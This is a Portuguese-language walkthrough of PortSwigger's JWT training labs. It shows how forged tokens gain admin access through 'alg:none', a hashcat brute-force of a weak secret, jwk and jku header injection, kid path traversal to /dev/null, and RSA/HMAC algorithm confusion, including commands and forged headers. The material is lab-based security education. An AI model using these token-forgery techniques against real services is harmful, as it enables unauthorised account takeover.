---
title: "PortSwigger - JWT"
author: "imendes"
date: 2026-01-18
subject: "PortSwigger Labs Walkthrough"
description: "Write-up técnico dos laboratórios de JWT da PortSwigger"
keywords: ["PortSwigger", "JWT", "Json Web Token", "Web Security"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [PortSwigger]
---

## Lab: JWT authentication bypass via unverified signature
"This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.
To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.
You can log in to your own account using the following credentials: wiener:peter"

Visualizamos o JWT após fazer login na conta que temos acesso, no header Cookie e atualizamos o token nos campos: 
- `"alg":"none"`
- `"sub":"admin"`
A resposta dessa requisição possui uma mensagem de erro que indica onde devemos alterar o token: 
```
Admin interface only available if logged in as an administrator
```
Após alterar esse campo `sub` para "administrator", é possível acessar o painel do administrador e apagar a conta “carlos”.

## Lab: JWT authentication bypass via flawed signature verification
"This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.
To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.
You can log in to your own account using the following credentials: wiener:peter"
Exatamente o mesmo processo do lab anterior.

## Lab: JWT authentication bypass via weak signing key
~This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.
To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.
You can log in to your own account using the following credentials: wiener:peter"

Primeiramente, vamos descobrir a chave por meio de força bruta com o token que temos posse (wiener):
```bash
$ hashcat -a 0 -m 16500 eyJraWQiOiI4MGY3MTgxMi1hYzBiLTQ4NGEtYjI0YS1hZmQwOTczNmJjOGMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NDMzMDY1Miwic3ViIjoid2llbmVyIn0.Ktdh8RvEDvpdW8rr0XxAapGlyX4uvsun6lKyU7muDb0 jwt_wordlist 
```
Usando a wordlist https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list , resulta na chave: `secret1`. 
Em posse de tal chave, podemos modificar o token na claim"sub" para "administrator" e assinar a o token com o segredo descoberto codificado em base64.
Assim, basta enviar a requisição para excluir o usuário "carlos" que aparece no painel do administrador acessado pela requisição com o token modificado:
```
GET /admin
```

## Lab: JWT authentication bypass via jwk header injection
"This lab uses a JWT-based mechanism for handling sessions. The server supports the `jwk` parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.

To solve the lab, modify and sign a JWT that gives you access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`"

Interceptamos a requisição após autenticação com o usuário que temos acesso e observamos o token: 

Usando a extensão JWT editor do Burp, geramos um par de chaves RSA e inserimos a chave pública no campo jwk do cabeçalho do token:
```
"jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "b5f47811-9e71-40ee-8eed-35a0e9bd0d87",
        "n": "0CB5U1XSU8gQJOeRmRI7aS-qiPi95EU4SNmWLu95zojGr4GEpFKvkgkav3XdbxS4m9DTMbfsHObbCdcb3HldlQ"
    }
```
Além disso, alteramos a claim "sub" para "administrator" e reassinamos o token com a chave gerada. 
Com isso, conseguimos acesso ao painel de administrador no caminho `/admin`. Após isso, excluímos o usuário "carlos".

## Lab: JWT authentication bypass via jku header injection
"This lab uses a JWT-based mechanism for handling sessions. The server supports the `jku` parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.

To solve the lab, forge a JWT that gives you access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`"

Primeiramente, criamos uma chave RSA e interceptamos a requisição com um JWT por meio da conta que temos acesso. 
Nesse contexto, modificamos o conteúdo do JWT, de modo que o header fique com esses parâmetros: 
```
{
    "kid": "b5f47811-9e71-40ee-8eed-35a0e9bd0d87",
    "alg": "RS256",
    "jku": "https://exploit-0a60008a03b80453802de33801270090.exploit-server.net/jwks.json"
}
```
Nesse caso, foi inserido o `jku` com a url do endpoint provido pelo PortSwigger para esse lab. Além disso, o `kid` foi modificado para que seja idêntico ao "kid" da chave na resposta da requisição GET da url especificada em `jku`, que contém o JWK set. Portanto, a resposta será assim:
```
{    
"keys": [ 
        {
          "kty": "RSA",
          "kid": "b5f47811-9e71-40ee-8eed-35a0e9bd0d87",
          "use": "sig",
          "alg": "RS256",
          "e": "AQAB",
          "n": "0CB5U1XSU8gQJOeRmRI7aS-qiPi95EU4SNmWLu95zojGr4GEpFKvkgkav3XdbxS4m9DTMbfsHObbCdcb3HldlQ"
         }
    ]
}
```
Com isso, basta modificar a claim `sub` para "administrator" e será garantido o acesso ao painel do administrador no caminho `admin/`

## Lab: JWT authentication bypass via kid header path traversal
"This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the `kid` parameter in JWT header to fetch the relevant key from its filesystem.

To solve the lab, forge a JWT that gives you access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`"

Alteramos o JWT de carlos para :
 Header: 
```
{
    "kid": "../../../dev/null",
    "alg": "HS256"
}
```
 Payload:
```
{
    "iss": "portswigger",
    "exp": 1754342030,
    "sub": "administrator"
}
```
e assinamos com uma chave gerada com o valor null em base64: `AA==`
Com isso, conseguimos acesso ao painel de administrador no caminho `admin/`

## Lab: JWT authentication bypass via algorithm confusion
"This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks.

To solve the lab, first obtain the server's public key. This is exposed via a standard endpoint. Use this key to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter "

No caminho `jwks.json` temos acesso às chaves públicas (JWK set):
```
{"keys":[{"kty":"RSA","e":"AQAB","use":"sig","kid":"281aadc1-9f99-4840-8952-3aaf18bc0af5","alg":"RS256","n":"ts8eFXFZ5WtaY3ti0GvLhaG0feGcTqd7DAJYiMemcS9v4kcBHjqsv_-wAhyXQVFNz3svVntTrkXY9UCAleAvo-GTW36_xy4BN349JRwABXZDtYKMxhuehhoWx_YM3fgNgz8EzLkw8afL9DibgGPw4BnbUJKWDP_l74jXE-gJmO-QLRAPlb2ZpF1trEfuvK5rBNhIpcbU8kaIpXGD652Dg3soBS8f0r3doEfGEYe5vrqjGQHHtTZGZOXXMbKKw-895qOS93fsz4xCKqJCQr8xEahKtTnHX_8odph-R-EyvAlmYuoWKxa4fTOjIW72iQm2uhNok8TFjDW8e6GC-IivjQ"}]}
```
Salvamos a chave pública no JWT editor do Burp Suite e no repeater selecionamos a opção "HMAC key confusion" em "Attack" que irá formatar a chave pública RSA salva para o formato HS256 a partir do PEM codificado em base64. Assim, o é alterado do seguinte modo, com `alg`, `typ` e `sub` alterados: 
Header: 
```
{
    "typ": "JWT",
    "alg": "HS256"
}
```
Payload:
```
{
    "iss": "portswigger",
    "exp": 1754346087,
    "sub": "administrator"
}
```
Assim, temos acesso ao painel do administrador e podemos excluir o usuário "carlos".

## Lab: JWT authentication bypass via algorithm confusion with no exposed key
"This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks.

To solve the lab, first obtain the server's public key. Use this key to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter "

Primeiramente, temos que descobrir dois tokens. Para fazer isso, apenas iremos pegar dois tokens com claim `exp` diferentes. 
`wiener`1:
```
eyJraWQiOiI0ZDMwZDQ2Mi0wMTZiLTQ4YTAtYWE1Zi0wNmE3YjI5YzcwZDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NDM1ODI1MSwic3ViIjoid2llbmVyIn0.AiUwi3FRY-9kgTa7NAHQzSXW7ykMDZ2gG9BevS22wb8Xwb3wxrxH_nP3-cuMETNpwFS0kU13yAlpLzsEO3--EUcerVkp3s8UsqdGJMXg9278PcI_iN_FTVqvBHIYjlzeimWl5WF27NM8MNws_7s0vJKe2nxF-CSn1xEHw4DQkzsygRvH00mICy0c6Q9gAyGOIpINadra9qElAQZ65vrQna79zjaxLruFmuhA7hG9Okyu_vUfKKPuQEg5-xbVU8Z7Dn9zROfaQeum-p965_PCEol6esGBLHExfHQzCZglMz38aHHGKLLOLCfI5RGYlvaanhy2BXXHGAa0riN63n8zGQ
```
`wiener`2:
```
eyJraWQiOiI0ZDMwZDQ2Mi0wMTZiLTQ4YTAtYWE1Zi0wNmE3YjI5YzcwZDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NDM1ODMxMiwic3ViIjoid2llbmVyIn0.iLCmztib8VpigtZkakT9-UVElcv888zuZ_icbAlmiq8vQu-HFlPT6forB7krktaLzgJ8Yp24BFaOPGdI9VZh-Qx_eD-osrG9Z_wbLiPcJcQjM5lk22cimIti4XjOkI2wh3hT3HbaAOodHnAMlv45JXPoO1kiD7daT207BlDCC86XzczjNlREHwSpNU-dVxkPf4upMBZ1ykp6aC_UnTSn2Un2edBG3rP7ujmNW749lGNVlZRpcAY2G-cXQGZkZ5qunJ5leiioTeZEdTFSwqaunh452noU8BNcW8MJ6sRocBWXUEag8U7rAsa7NKuB6Y51-XfgkCoBb3blIzxyswddnQ
```
Com isso, utilizamos o script jwt_forgery.py para tentar extrair a chave pública RSA com o comando:
```bash
docker run --rm -it portswigger/sig2n <token1> <token2> 
```
resultando em um valor de `n` que usaremos para assinar o JWT modificado. 
Após obter a chave pública, o processo segue exatamente como em "Lab: JWT authentication bypass via algorithm confusion"
